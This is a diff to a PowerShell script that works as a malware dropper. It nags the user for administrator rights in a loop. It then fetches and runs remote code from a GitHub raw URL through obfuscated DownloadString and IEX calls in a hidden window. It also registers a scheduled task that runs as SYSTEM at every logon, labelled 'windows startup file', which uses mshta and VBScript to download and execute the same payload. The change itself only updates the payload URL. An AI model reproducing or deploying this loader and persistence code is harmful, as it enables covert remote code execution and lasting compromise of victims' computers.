@@ -28,7 +28,7 @@ Add-Type @"
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
      while(1) {
          try {
-             $code = ("https://raw.githubusercontent.com/gingogaming-dot/test/refs/heads/main/a")
+             $code = ("https://raw.githubusercontent.com/gingogaming-dot/test/refs/heads/main/a.ps1")
              $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
              Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
              Clear-Host
@@ -38,7 +38,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
  }
 
 $task_name = "simpletask"
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/gingogaming-dot/test/refs/heads/main/a')|iex`",0)(window.close)"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/gingogaming-dot/test/refs/heads/main/a.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force
